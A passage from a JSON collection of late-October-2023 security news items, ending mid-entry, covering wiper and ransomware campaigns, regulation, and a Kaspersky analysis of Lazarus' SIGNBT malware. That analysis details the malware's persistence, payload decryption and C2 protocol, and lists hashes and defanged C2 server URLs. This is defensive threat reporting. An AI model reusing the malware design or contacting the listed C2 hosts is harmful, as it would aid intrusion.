[
   {
      "time": "2023-10-31",
      "title": "UAE Bolsters Cyber Future With US Treasury Partnership, Collaborations",
      "text": " The United Arab Emirates' Cybersecurity Council has agreed to a number of partnerships to better improve its threat intelligence sharing capabilities, including forging ahead with collaborations with other nations.\"This allows the parties involved to see the issue of cyber defense from different points of view, and will certainly aid in a better and more well-rounded security posture for all involved, not just the UAE,\" says Andi Ursry, cyber-threat intelligence analyst at Optiv.Al Kuwaiti commented that the UAE's ICT industry has opened new \"windows of opportunity\" but added that the nation is also vulnerable to new and sophisticated types of security risks, which are dynamic and evolving in nature. As a result, these MoUs are forged with partners \"with the essential expertise and tools to eliminate information security incidents.\"The UAE Cybersecurity Council's actions in the past few weeks show clear ambitions for the country to be more global in its cyber capabilities, says Vibin Shaju, UAE general manager at Trellix. \"MOUs and public-private partnerships can encompass information sharing, collaborative incident response, regulatory compliance, public awareness and education, collaborative exercises and drills,\" he notes. \"Such collaboration is critical for addressing the dynamic and evolving nature of cybersecurity threats.\" Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."
   },
   {
      "time": "2023-10-31",
      "title": "New BiBi-Linux wiper malware targets Israeli orgs in destructive attacks",
      "text": " A new malware wiper known as BiBi-Linux is being used to destroy data in attacks targeting Linux systems belonging to Israeli companies.The malware reveals its true nature by not dropping a ransom note or providing victims with a way to reach out to the attackers to negotiate payment for a decryptor, even though it fakes file encryption,\"Instead, it conducts file corruption by overwriting files with useless data, damaging both the data and the operating system.\"The payload (an x64 ELF executable named bibi-linux.out) found on the victim's systems allows the attackers to choose what folders to encrypt via command-line parameters.It can completely wipe a compromised device's operating system when run with root privileges if the attackers do not provide a target path, as it will attempt to delete the entire '/' root directory.BiBi-Linux uses multiple threads and a queue system for improved speed and effectiveness. It will overwrite files' contents to destroy them, renaming them using a ransom name and an extension made out of the 'BiBi' string (Bibi is a nickname used for Israel's Prime Minister, Benjamin Netanyahu) followed by a number.As seen by BleepingComputer, the number appended to the extension is the number of rounds a file has been wiped.The wiper sample discovered by Security Joes also features no obfuscation, packing, or other protective measures, making malware analysts' jobs much easier.This shows the threat actors are not concerned about their tools being captured and dissected, instead focusing on maximizing their attack's impact.Destructive malware has also been used extensively by Russian threat groups to target the systems of Ukrainian organizations since Russia invaded Ukraine in February 2022."
   },
   {
      "time": "2023-10-31",
      "title": "FTC orders non-bank financial firms to report breaches in 30 days",
      "text": " The U.S. Federal Trade Commission (FTC) has amended the Safeguards Rules, mandating that all non-banking financial institutions report data breach incidents within 30 days.Such entities include mortgage brokers, motor vehicle dealers, payday lenders, investment firms, insurance companies, peer-to-peer lenders, and asset management firms.This requirement adds to the Safeguards Rule, aiming to enhance data security measures to protect customer information and strengthen compliance obligations.It applies to security incidents that impact 500 or more consumers, especially if unauthorized third parties accessed unencrypted (cleartext) information.\"The addition of this disclosure requirement to the Safeguards Rule should provide companies with additional incentive to safeguard consumers' data.\"The notification requirement does not apply to cases where consumer information is encrypted as long as the attackers did not access the encryption key.The notice breached firms need to be submitted onto FTC's online portal and must include details about the security incident, such as:The agency has added a provision for a 60-day delay should a law enforcement official seek an extension in the public disclosure of a specific incident.The FTC emphasizes that submitting a data breach report doesn't automatically imply a violation of the Safeguards Rule, nor does it ensure an investigation or enforcement action.The new notification requirement will become effective 180 days after publication of the rule in the Federal Register, so the rule should be applicable starting in April 2024."
   },
   {
      "time": "2023-10-31",
      "title": "RCE exploit for Wyze Cam v3 publicly released, patch now",
      "text": " A security researcher has published a proof-of-concept (PoC) exploit for Wyze Cam v3 devices that opens a reverse shell and allows the takeover of vulnerable devices.Wyze Cam v3 is a top-selling, inexpensive indoor/outdoor security camera with support for color night vision, SD card storage, cloud connectivity for smartphone control, IP65 weatherproofing, and more.The first is a DTLS (Datagram Transport Layer Security) authentication bypass problem in the 'iCamera' daemon, allowing attackers to use arbitrary PSKs (Pre-Shared Keys) during the TLS handshake to bypass security measures.The second flaw manifests after the DTLS authenticated session has been established when the client sends a JSON object.The iCamera code that parses that object can be exploited due to bad handling of a specific array, leading to a stack buffer overflow where data is written into unintended parts of the memory.Attackers can leverage the second vulnerability to overwrite the stack memory and, given the lack of security features like stack canaries and position-independent execution in the iCamera code, execute their own code on the camera.The exploit was tested and confirmed to work on firmware versions 4.36.10.4054, 4.36.11.4679, and 4.36.11.5859.In a private discussion, Geissler explained to BleepingComputer that he made his exploit available to the public before most Wyze users could apply the patch to express his disapproval of Wyze's patching strategies.Releasing the fixes right after the registration had caused several teams that had a working exploit in their hands up until that moment to abandon the effort.Wyze told the researcher that the timing was a coincidence and that they were merely trying to safeguard their customers against a threat they had learned about a few days before.BleepingComputer reached out to Wyze for a comment about Geissler's accusations but has not received a response at this time.At this point, the PoC is now public, so it is likely to see mass exploitation in the future, and users are recommended to take immediate action to fix the bug.If unable to apply the firmware update, users should isolate their Wyze cameras from networks that serve critical devices."
   },
   {
      "time": "2023-10-31",
      "title": "Toronto Public Library services down following weekend cyberattack",
      "text": " The Toronto Public Library (TPL) is warning that many of its online services are offline after suffering a cyberattack over the weekend, on Saturday, October 28.TPL is Canada's largest public library system, giving people access to 12 million books through 100 branch libraries across Toronto. It has 1,200,000 registered members and operates on a budget that surpasses $200M.In an announcement published on a website created by the Toronto Public Library while their main site is offline, the library says that the following services are currently unavailable:However, the announcement clarifies that library branches remain open and operate according to the published schedule, so people may continue to borrow and return books as usual. WiFi access on the branches remains available, and telephone lines are operational.Also, online services hosted elsewhere, beyond tpl.ca, like Kanopy, Digital Archive, Digital Archive Ontario, TPL Kids, and 'Ready for Reading,' remain available.TPL's announcement does not provide any details on the type of cybersecurity incident that they suffered but mentions that there's currently no evidence that staff or customers have had their data exposed as a result.The organization underlines its quick response, the result of robust, proactive security measures, and requests patience, as complete system restoration might take a while.\"We do anticipate though that it may take several days before all systems are fully restored to normal operations.\"By the time of writing, no ransomware actors had taken responsibility for the attack on TPL's systems.Canadian firms and organizations have been the target of quite a few cyberattacks recently that have impacted service availability and raised concerns about potential data breaches."
   },
   {
      "time": "2023-10-31",
      "title": "SEC sues SolarWinds for misleading investors before 2020 hack",
      "text": " The U.S. Securities and Exchange Commission (SEC) today charged SolarWinds with defrauding investors by allegedly concealing cybersecurity defense issues before a December 2020 linked to APT29, the Russian Foreign Intelligence Service (SVR) hacking division.The SEC claims SolarWinds failed to notify investors about cybersecurity risks and poor practices that its Chief Information Security Officer, Timothy G. Brown (also facing legal action from regulatory authorities), knew about. Instead, the company reportedly disclosed only broad and theoretical risks to its investors.\"Rather than address these vulnerabilities, SolarWinds and Brown engaged in a campaign to paint a false picture of the company's cyber controls environment, thereby depriving investors of accurate material information.\"The regulator claims that Brown was already aware that attackers that would hack SolarWinds' systems remotely would be very hard to detect since at least 2018, according to presentations saying that the \"current state of security leaves us in a very vulnerable state for our critical assets\" and that \"[a]ccess and privilege to critical systems/data is inappropriate.\"Brown also expressed concerns in June 2020 that attackers could use SolarWinds' Orion software (which was trojanized by the Russian hackers to breach customers' systems months later) as a tool in future attacks because the company's backend systems were not \"resilient.\"Two months before the attack, the SEC says that a SolarWinds internal document revealed that the engineering teams were no longer able to keep up with a long list of new security issues that they had to address.\"We made a deliberate choice to speak—candidly and frequently—with the goal of sharing what we learned to help others become more secure. We partnered closely with the government and encouraged other companies to be more open about security by sharing information and best practices.\"The SEC's charges now risk the open information-sharing across the industry that cybersecurity experts agree is needed for our collective security.\"The malicious builds were used to drop the Sunburst backdoor onto the systems of \"fewer than 18,000\" victims. However, the attackers handpicked a substantially lower number of targets for second-stage exploitation.Update October 30, 18:14 EDT: A SolarWinds spokesperson sent the following statement after the article was published:We are disappointed by the SEC’s unfounded charges related to a Russian cyberattack on an American company and are deeply concerned this action will put our national security at risk. The SEC’s determination to manufacture a claim against us and our CISO is another example of the agency’s overreach and should alarm all public companies and committed cybersecurity professionals across the country. We look forward to clarifying the truth in court and continuing to support our customers through our Secure by Design commitments."
   },
   {
      "time": "2023-10-31",
      "title": "Wiki-Slack attack allows redirecting business professionals to malicious websites",
      "text": " The attackers choose a subject in Wikipedia that can be of interest to the potential victims, then they will go to the first page of the Wikipedia entry and edit the page. The trick consists of adding a legitimate referenced footnote to the entry. The footnote allows to set the stage for a formatting error when the article is shared on Slack. Once certain additional conditions are met – made easy by small grammatical changes to the Wikipedia article, Slack will render a link that is not visible in the original Wikipedia article.The researchers pointed out that the footnote itself is not malicious, but under certain additional conditions due to small grammatical changes to the Wikipedia article, Slack will render a link that is not visible in the original Wikipedia article.The three conditions that must be met are:This leads Slack to mishandle the spacing between the first and second paragraph, resulting in the creation of a new link in Slack. The researchers found more than 1,000 instances of this unintentional artifact.eSentire furter elaborated that attackers could leverage Wikipedia statistics to choose pages that generate a high volume of traffic and use them to launch attacks with the Wiki-Slack technique.The researchers explained that the Wiki-Slack attack is a numbers game, for this reason, leveraging ChatGPT or similar Large Language Model (LLM) an attacker can scale out the attack in a short time.Organizations are recommended to be vigilant on browser-based attacks that can lead to malware infections. Employing endpoint monitoring, and building cyber resilience into their processes can allow organizations to limit the exposure to such kinds of attacks.\nCopyright@securityaffairs 2023 "
   },
   {
      "time": "2023-10-31",
      "title": "LastPass breach linked to theft of $4.4 million in crypto",
      "text": " Hackers have stolen $4.4 million in cryptocurrency on October 25th using private keys and passphrases stored in stolen LastPass databases, according to research by crypto fraud researchers who have been researching similar incidents.\"We regularly have people reach out via DM who have had their crypto assets stolen. We also approach victims we discover on-chain,\" ZachXBT told BleepingComputer.\"We ask potential LastPass victims multiple questions and typically have found one commonality between them all being LastPass.\"According to a tweet by ZachXBT on X, the threat actors stole $4.4 million from 25+ victims due to a LastPass breach in 2022.At the time, LastPass CEO Karim Toubba said that while the encrypted vaults were stolen, only customers knew the master password required to decrypt them.However, LastPass warned that for those using weaker passwords, it was advised to reset the master password.This suggestion was given because a weaker password can more easily be cracked using specialized programs that utilize a GPU to brute force easy-to-crack passwords.Once they gain access to this information, they can load the wallets onto their own devices and drain them of all funds.\"The number of victims who only had the specific group of seeds/keys that were drained stored in LastPass is simply too much to ignore.\"It is becoming increasingly clear that the threat actors behind the LastPass attack have successfully cracked the passwords for vaults and are using the stolen information to fuel their own attacks.Therefore, if you are a LastPass user who had an account during the August and December 2022 breaches, it is strongly suggested that you reset all of your passwords, including your password."
   },
   {
      "time": "2023-10-31",
      "title": "UAE Cyber Council Warns of Google Chrome Vulnerability",
      "text": " The United Arab Emirates' Cybersecurity Council has issued a warning about a high-risk vulnerability in Google Chrome, which could allow malicious actors to execute code remotely.Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."
   },
   {
      "time": "2023-10-31",
      "title": "StripedFly, a complex malware that infected one million devices without being noticed",
      "text": " Researchers from Kaspersky discovered a sophisticated malware, dubbed StripedFly, that remained under the radar for five years masquerading as a cryptocurrency miner.The malicious code has a complex modular structure that supports both Linux and Windows. The malicious code relies on a built-in TOR network tunnel for C2 communications, it supports an update and delivery functionality through trusted services such as GitLab, GitHub, and Bitbucket. Kaspersky researchers discovered that over one million updates have been downloaded from the C2 infrastructure since 2017.The malware uses different techniques to maintain persistence depending on the presence of the PowerShell interpreter and the privileges granted for the process. Typically, it modifies the registry or creates scheduler tasks on Windows systems. The experts reported that the malicious code also uses multiple methods on Linux as well.The functionality within the malware modules are divided into two types, service and extended functionality modules.The malware uses the modules for storing its configuration, upgrading and uninstalling itself, establishing a reverse proxy, harvesting credentials, performing reconnaissance and files, taking screenshots, executing processes, recording microphone input, and mining for Monero.While investigating this malware, Kaspersky also discovered an apparently related ransomware variant called. Similarities include the Tor client and multiple modules observed in StripedFly.“What was the real purpose? That remains a mystery. While ThunderCrypt ransomware suggests a commercial motive for its authors, it raises the question of why they didn’t opt for the potentially more lucrative path instead. The prevailing narrative often centers around ransomware actors collecting anonymous ransoms, but this case seems to defy the norm.” concludes the report”The question remains, but only those who crafted this enigmatic malware hold the answer. It’s difficult to accept the notion that such sophisticated and professionally designed malware would serve such a trivial purpose, given all the evidence to the contrary.”\nCopyright@securityaffairs 2023 "
   },
   {
      "time": "2023-10-31",
      "title": "A cascade of compromise: unveiling Lazarus' new campaign | Securelist",
      "text": " Solutions for:ThreatsCategories27 Oct 2023\n  minute read\t\t\t\t\t\t\t\tTable of ContentsAuthorsEarlier this year, a software vendor was compromised by the Lazarus malware delivered through unpatched legitimate software. What’s remarkable is that these software vulnerabilities were not new, and despite warnings and patches from the vendor, many of the vendor’s systems continued to use the flawed software, allowing the threat actor to exploit them. Fortunately, a proactive response by us detected an attack on another vendor and effectively thwarted the attacker’s efforts.Upon further investigation, we discovered that the software vendor that developed the exploited software had previously fallen victim to Lazarus several times. This recurring breach suggested a persistent and determined threat actor with the likely objective of stealing valuable source code or tampering with the software supply chain, and they continued to exploit vulnerabilities in the company’s software while targeting other software makers.Infection timelineThe adversary demonstrated a high level of sophistication, employing advanced evasion techniques and introducing SIGNBT malware for victim control. In addition, other malware found in memory included Lazarus’ prominent LPEClient, a tool known for victim profiling and payload delivery that has previously been observed in attacks on defense contractors and the cryptocurrency industry.Executive summary:In mid-July 2023, we detected a series of attacks on several victims who had been targeted through legitimate security software designed to encrypt web communications using digital certificates. The exact method by which this software was exploited to deliver the malware remains elusive. However, we identified post-exploitation activity within the processes of the legitimate software. In one instance, while examining the memory of the compromised security software from a victim’s system, we discovered the presence of the SIGNBT malware accompanied by a shellcode. This shellcode was responsible for launching a Windows executable file directly in memory.The actor uses various tactics to establish and maintain persistence on compromised systems. These include the creation of a file called ualapi.dll in the system folder, which is automatically loaded by the spoolsv.exe process at each system boot. Additionally, in several instances, registry entries were recorded to execute legitimate files for the purpose of malicious side-loading, further ensuring a resilient persistence mechanism.Methods for loading the final payloadThe loader process retrieves the first 32 bytes from tw-100a-a00-e14d9.tmp and uses this data as an AES decryption key to decrypt the remaining contents. Once decrypted, the payload, a Windows executable identified as SIGNBT, is loaded directly into memory. In this case, the loaded payload also reads the configuration file from the same path, but with a slightly different file name.Inside this file is a base64-encoded string, mirroring the approach used in the previous SIGNBT malware method. The first 32 characters of this string serve as the AES decryption key, while the subsequent data contains configuration information used by the malware. This decrypted configuration data includes details such as three C2 addresses, which are referred to as proxies, sleep intervals, version information, monitored targets, and various other parameters critical to the malware’s operation.The majority of SIGNBT malware instances are launched through the malware loader, which operates exclusively in memory. Upon execution, the malware begins communicating with the C2 server by sending a beacon after initialization of its configuration data. In its C2 communication, the malware uses distinctive strings that start with SIGNBT. This unique characteristic has earned it the designation of SIGNBT. In addition, the malware uses different prefixes at each stage of its C2 operation to verify and maintain its activities.The malware employs a multi-step process to create a 24-byte value for various purposes. First, it generates this value with the following components:After creating this 24-byte value, the malware generates an additional 24 bytes of random data. These two sets of 24 bytes are then XORed together using another randomly generated 24-byte key. Subsequently, both the resulting value and the 24-byte key are encoded with base64. Finally, these encoded values are combined with either three or seven randomly generated HTTP parameter names. In all future C2 communications, the malware uses a similar structure, making it more challenging to detect and analyze its communications.Structure of HTTP POST dataThe malware uses a mechanism to validate the response data received from the C2 server. Specifically, it checks to see if the response data contains a hard-coded HTML script.\nDuring the validation process, the malware decodes the first 12 bytes from the C2 server using base64, replacing the spaces with plus signs to create a seven-character string. This process is then repeated with the next 12 bytes. The first seven characters from each set are then XORed and compared to the “success” string. This repetitive procedure is applied to every HTTP communication sequence to verify that the response aligns with the expected “success” criterion.Next, the malware sends HTTP requests with the SIGNBTKE header, and if it receives a “success” message from the C2 server, it activates the getInfo function within the CCBrush class. This function gathers various information about the victim’s computer, such as computer name, product name, OS details, system uptime, CPU information, system locale, time zone, network status, and malware configuration data. After sending this system-specific information, the malware sends another HTTP request with the SIGNBTGC prefix, this time using a randomly chosen embedded HTTP parameter from a list of 100 possible parameter names.\nThe data received from the C2 server is decrypted using AES with a decryption key obtained from a SIGNBTLG HTTP request. If the decrypted data is “keep”, the malware responds with an “OK” message using the SIGNBTSR prefix, indicating a successful communication. If there are problems, the malware uses the SIGNBTFI prefix to convey the nature of the problem or failure in communication. To summarize, the C2 communication process can be described as follows:C2 communication processIf the delivered data does not equal “keep”, indicating that specific instructions or actions are required, the malware proceeds to invoke the corresponding class and function for backdoor behavior. The SIGNBT malware is equipped with an extensive set of functionalities designed to exert control over the victim’s system. To perform these functions, the malware receives instructions from the C2 server in the form of a class name, function name, and any necessary parameters. It then executes the relevant function embedded in the malware’s codebase.The name of each backdoor command is straightforward, implementing commonly used Windows commands such as ping, netstat, and systeminfo. It’s important to note that the backdoor is capable of implanting an additional payload for auto execution, internally named “deploy”. This backdoor function receives file paths via command-line arguments decrypted with AES. Using this command, SIGNBT has been observed to implant the phantom DLL we already described in the SIGNBT loader section above.Based on the analysis, it is evident that the actor’s initial compromise of the victim involved exploiting vulnerabilities within the software exploit. They then proceeded to deploy the SIGNBT malware using a DLL side-loading technique. Furthermore, the actor used the backdoor capability “deploy” to implant an additional payload for automated execution. This multifaceted attack demonstrates a high level of sophistication and a deliberate effort to infiltrate and maintain control over the victim’s system.Using the comprehensive backdoor as described above, the actor deploys additional malware in the victim’s memory. Notably, these newly delivered malware variants predominantly execute in the system’s memory only, without touching the disk. Based on our telemetry, the actor has been observed to deliver such tools as LPEClient and credential dumping utilities to the victim machines.Additional payload delivered by SIGNBTThe infection chains of the three campaigns attributed to Lazarus in 2023The Lazarus group remains a highly active and versatile threat actor in today’s cybersecurity landscape. The threat actor has demonstrated a profound understanding of IT environments, refining their tactics to include exploiting vulnerabilities in high-profile software. This approach allows them to efficiently spread their malware once initial infections are achieved. Moreover, the activities of this notorious actor transcend geographic boundaries and industry sectors. They have targeted various industries, each with distinct objectives and using different tools, tactics and techniques. This underscores their recent and ongoing activity characterized by sophisticated methods and unwavering motivations.SIGNBT loader\n9cd90dff2d9d56654dbecdcd409e1ef3         %system%\\ualapi.dll\n88a96f8730b35c7406d57f23bbba734d        %system%\\ualapi.dll\n54df2984e833ba2854de670cce43b823       %system%\\ualapi.dll\nAe00b0f490b122ebab614d98bb2361f7          %system%\\ualapi.dll\ne6fa116ef2705ecf9677021e5e2f691e\n31af3e7fff79bc48a99b8679ea74b589           C:\\GoogleD\\Coding\\JS\\Node\\winhttp.dllSIGNBT\n9b62352851c9f82157d1d7fcafeb49d3LPEClient\n3a77b5054c36e6812f07366fb70b007d       %systme%\\wbem\\wbemcomn.dll\nE89fa6345d06da32f9c8786b65111928 %ProgramData%\\Microsoft\\Windows\\ServiceSetting\\ESENT.dllFile path\nC:\\GoogleD\\Coding\\JS\\Node\\SgrmLpac.exe\nC:\\GoogleD\\Coding\\JS\\Node\\winhttp.dll\nC:\\Windows\\system32\\config\\systemprofile\\appdata\\Local\\tw-100a-a00-e14d9.tmp\nC:\\Windows\\system32\\config\\systemprofile\\appdata\\Local\\tw-100b-a00-e14d9.tmp\nC:\\ProgramData\\ntuser.008.dat\nC:\\ProgramData\\ntuser.009.dat\nC:\\ProgramData\\ntuser.001.dat\nC:\\ProgramData\\ntuser.002.dat\nC:\\ProgramData\\Microsoft\\Windows\\ServiceSetting\\ESENT.dllC2 servers\nhxxp://ictm[.]or[.]kr/UPLOAD_file/board/free/edit/index[.]php\nhxxp://samwoosystem[.]co[.]kr/board/list/write[.]asp\nhxxp://theorigin[.]co[.]kr:443/admin/management/index[.]php\nhxxp://ucware[.]net/skins/PHPMailer-master/index[.]php\nhxxp://www[.]friendmc[.]com/upload/board/asp20062107[.]asp\nhxxp://www[.]hankooktop[.]com/ko/company/info[.]asp\nhxxp://www[.]khmcpharm[.]com/Lib/Modules/HtmlEditor/Util/read[.]cer\nhxxp://www[.]vietjetairkorea[.]com/INFO/info[.]asp\nhxxp://yoohannet[.]kr/min/tmp/process/proc[.]php\nhxxps://admin[.]esangedu[.]kr/XPaySample/submit[.]php\nhxxps://api[.]shw[.]kr/login_admin/member/login_fail[.]php\nhxxps://hicar[.]kalo[.]kr/data/rental/Coupon/include/inc[.]asp\nhxxps://hspje[.]com:80/menu6/teacher_qna[.]asp\nhxxps://kscmfs[.]or[.]kr/member/handle/log_proc[.]php\nhxxps://kstr[.]radiology[.]or[.]kr/upload/schedule/29431_1687715624[.]inc\nhxxps://little-pet[.]com/web/board/skin/default/read[.]php\nhxxps://mainbiz[.]or[.]kr/SmartEditor2/photo_uploader/popup/edit[.]asp\nhxxps://mainbiz[.]or[.]kr/include/common[.]asp\nhxxps://new-q-cells[.]com/upload/newsletter/cn/frame[.]php\nhxxps://pediatrics[.]or[.]kr/PubReader/build_css[.]php\nhxxps://pms[.]nninc[.]co[.]kr/app/content/board/inc_list[.]asp\nhxxps://safemotors[.]co[.]kr/daumeditor/pages/template/template[.]asp\nhxxps://swt-keystonevalve[.]com/data/editor/index[.]php\nhxxps://vnfmal2022[.]com/niabbs5/upload/gongji/index[.]php\nhxxps://warevalley[.]com/en/common/include/page_tab[.]asp\nhxxps://www[.]blastedlevels[.]com/levels4SqR8/measure[.]asp\nhxxps://www[.]droof[.]kr/Board/htmlEdit/PopupWin/Editor[.]asp\nhxxps://www[.]friendmc[.]com:80/upload/board/asp20062107[.]asp\nhxxps://www[.]hanlasangjo[.]com/editor/pages/page[.]asp\nhxxps://www[.]happinesscc[.]com/mobile/include/func[.]asp\nhxxps://www[.]healthpro[.]or[.]kr/upload/naver_editor/subview/view[.]inc\nhxxps://www[.]medric[.]or[.]kr/Controls/Board/certificate[.]cer\nhxxps://www[.]muijae[.]com/daumeditor/pages/template/simple[.]asp\nhxxps://www[.]muijae[.]com/daumeditor/pages/template/template[.]asp\nhxxps://www[.]nonstopexpress[.]com/community/include/index[.]asp\nhxxps://www[.]seoulanesthesia[.]or[.]kr/mail/mail_211230[.]html\nhxxps://www[.]seouldementia[.]or[.]kr/_manage/inc/bbs/jiyeuk1_ok[.]asp\nhxxps://www[.]siriuskorea[.]co[.]kr/mall/community/bbs_read[.]asp\nhxxps://yoohannet[.]kr/min/tmp/process/proc[.]phpAuthorsA cascade of compromise: unveiling Lazarus’ new campaignYour email address will not be published. Required fields are marked *Name * Email * ΔTable of ContentsGReAT webinarsFrom the same authorsThe hottest research right in your inboxΔIn the same categoryAsian APT groups target various organizations from a multitude of regions and industries. We created this report to provide the cybersecurity community with the best-prepared intelligence data to effectively counteract Asian APT groups.We unveil a Lazarus campaign exploiting security company products and examine its intricate connections with other campaignsHow Kaspersky researchers obtained all stages of the Operation Triangulation campaign targeting iPhones and iPads, including zero-day exploits, validators, TriangleDB implant and additional modules.Nobody would even suspect the mining malware was merely a mask, masquerading behind an intricate modular framework that supports both Linux and Windows.  The amount of effort that went into creating the framework is truly remarkable, and its disclosure was quite astonishing.The hottest research right in your inboxΔThreatsCategories© 2023 AO Kaspersky Lab. All Rights Reserved.\nRegistered trademarks and service marks are the property of their respective owners.The hottest research right in your inboxΔ"
   },
   {
      "time": "2023-10-30",
      "title": "Google Expands Its Bug Bounty Program to Tackle Artificial Intelligence Threats",
      "text": " \"Metadata such as SLSA provenance that tell us what's in software and how it was built, allowing consumers to ensure license compatibility, identify known vulnerabilities, and detect more advanced threats.\"Join us for our webinar to learn how to tackle challenges, launch a program, and choose the right solution.Join the conversation with security gurus to learn about technologies that can shield your web apps from stealthy attacks.Sign up for free and start receiving your daily dose of cybersecurity news, insights and tips."
   },
   {
      "time": "2023-10-30",
      "title": "\r\n\tSecurity Agency Rolls Out Protective DNS for Schools - Infosecurity Magazine\r\n",
      "text": " UK / EMEA News Reporter, Infosecurity MagazineThe UK’s National Cyber Security Centre (NCSC) has announced the launch of a new offering designed to prevent school users visiting malicious websites.PDNS for Schools is completely free and will be rolled out from now into the coming year, according to NCSC deputy director for economy and society, Sarah Lyons.“This timeframe will allow us to test capacity in the service and ensure we can deliver a PDNS offer to the different types of schools across the UK,” she explained.PDNS for Schools is based on a long-running and highly successful part of the NCSC’s Active Cyber Defence strategy: the Protective Domain Name Service (PDNS).Implemented by .uk registry Nominet back in 2017, it is a recursive resolver – finding answers to DNS queries and blocking access to risky sites.“In addition, PDNS provides organizations that use it with metrics about the health of their networks and gives them access to NCSC outreach support to resolve any issues. The data from PDNS is also used to inform and support UK government cyber-incident response functions in the event of a cyber-attack.”In the meantime, local authorities in England and eligible public sector networks in Scotland, Wales and Northern Ireland that provide DNS to their schools are encouraged to sign up for the service."
   },
   {
      "time": "2023-10-30",
      "title": "Lazarus hackers breached dev repeatedly to deploy SIGNBT malware",
      "text": " The North Korean Lazarus hacking group repeatedly compromised a software vendor using flaws in vulnerable software despite multiple patches and warnings being made available by the developer.The fact that Lazarus breached the same victim multiple times indicates that the hackers aimed to steal source code or attempt a supply chain attack.\"This recurring breach suggested a persistent and determined threat actor with the likely objective of stealing valuable source code or tampering with the software supply chain, and they continued to exploit vulnerabilities in the company's software while targeting other software makers,\" explains Kaspersky.The attack was discovered by Kaspersky in July 2023, which observed Lazarus employing a diverse infection chain and post-compromise toolset.Kaspersky places this attack within the broader scope of a campaign in which Lazarus targeted various software vendors between March 2023 and August 2023.The report mentions that Lazarus targeted legitimate security software used for the encryption of web communications. However, the exact exploitation method the hackers followed remains unknown.The exploitation led to the deployment of the SIGNBT malware along with shellcode used for injecting the payload into memory for stealthy execution.Persistence is established by adding a malicious DLL ('ualapi.dll') onto Startup to be executed by 'spoolsv.exe,' or performing Windows Registry modifications.The malicious DLL file performs victim ID verification checks before it decrypts and loads the SIGNBT payload from a local filesystem path to ensure the infection proceeds onto the intended targets.SIGNBT gets its name from the distinct strings it uses for command and control (C2) communications, sending information about the compromised system and receiving commands for execution.The commands supported by SIGNBT are:SIGNBT can also fetch additional payloads from the C2 and deploy them on the host, providing Lazarus with operational versatility.Kaspersky has seen Lazarus leverage that feature on SIGNBT to load credential dumping tools and the LPEClient malware on compromised systems.LPEClient is an info-stealer and malware loader on itself, which, in its latest versions, Kaspersky says demonstrates significant evolution compared to previously documented samples.Kaspersky says Lazarus incorporates the LPEClient on other campaigns it ran in 2023, albeit it used the malware at earlier infection phases to inject other payloads.Overall, the Lazarus group remains one of the most active and dangerous threat actors, maintaining a broad targeting scope across regions and industries.Their recent actions underscore their sophisticated tactics and persistent goals, emphasizing organizations' need to proactively patch software and prevent easy exploitation of vulnerabilities for initial compromise."
   },
   {
      "time": "2023-10-30",
      "title": "New Hunters International ransomware possible rebrand of Hive",
      "text": " A new ransomware-as-a-service brand named Hunters International has emerged using code used by the Hive ransomware operation, leading to the valid assumption that the old gang has resumed activity under a different flag.This theory is supported by analysis of the new encryptor revealing multiple code overlaps between the two ransomware gangs.Security researchers analyzing a sample of the Hunters International malware discovered a striking resemblance to the code used in Hive ransomware attacks.Looking closer at the Hunters International sample, the researcher discovered code overlaps and similarities that match more than 60% of the code in Hive ransomware.However, the Hunters International group is denying the researchers’ “allegations” saying that they are a new service on the ransomware scene who purchased the encryptor source code from the Hive developers.“All of the Hive source codes were sold including the website and old Golang and C versions and we are those who purchased them,” the Hunters International gang says.Hive International claims that Hive’s code contained “a lot of mistakes that caused unavailability for decryption in some cases” but they fixed it.Furthermore, the new gang says that encryption is not the main goal of their operation, instead focusing on stealing data as leverage when extorting victims into paying a ransom demand.From analysis by BleepingComputer, Hunters International's encryptor appends the “.LOCKED” extension to the processed files.The malware leaves in each directory a plaintext file named \"Contact Us.txt\" with instructions for the victim to contact the attacker over Tor, through a chat page that is protected by a login specific for each victim.At the moment, their data leak site lists only one victim, a school in the UK, from where the attackers claim to have stolen almost 50,000 files consisting of data about students and teachers along with network and web credentials.It remains to be seen what fate awaits Hunters International's but with one victim published on their data leak site, the group does not appear to be too active.Whether Hive ransomware sold the source code to other cybercriminals or not, remains unknown at the moment but the gang's operations came to a sudden stop after its Tor payment and data leak site were seized in an international operation in January.According to the FBI, the gang breached more than 1,300 companies and recived ransom payments of about $100 million.The agency's activity allowed it to provide more than 1,300 decryption keys to Hive ransomware victims that had been encrypted before and after the FBI gained access to the attacker's environments."
   },
   {
      "time": "2023-10-30",
      "title": "Pirate IPTV network in Austria dismantled and $1.74 million seized",
      "text": " The Austrian police have arrested 20 people across the country linked to an illegal IPTV network that, between 2016 and 2023, decrypted copyright-protected broadcasts and redistributed them to thousands of customers.Investigation into the illegal network started after a complaint was filed in Germany, leading to the discovery of a criminal enterprise consisting of 80 perpetrators, all Turkish citizens.The piracy ring operated on a hierarchy of suppliers, who decrypted and supplied TV signals, and resellers, who bought access to the signal for up to $50/year and resold it to end customers for up to $200/year.Although the operation was briefly promoted through Facebook advertisements, customers were reached primarily through 'word of mouth,' with many customers turning into resellers in a pyramid-like expansion.The police's announcement says 15 resellers and three suppliers were identified in Austria. Each of the resellers had between 300 and 2,500 customers, who paid them an annual subscription to access the illegal broadcast.The arrests were made in Vienna, Lower Austria, Salzburg, Vorarlberg, and Tyrol, with the following items seized during the law enforcement operation:\"Some of the illegally earned money was used for legal investments and thus introduced the suppliers into the higher economic cycle.\"The arrested individuals have pleaded guilty to commercial fraud, money laundering, the Access Control Act, and provisions of the Copyright Act.The remaining members of the crime group are in Germany, where the center of the illegal operations was located, but the authorities there have yet to begin civil proceedings."
   },
   {
      "time": "2023-10-30",
      "title": "Hackers email stolen student data to parents of Nevada school district",
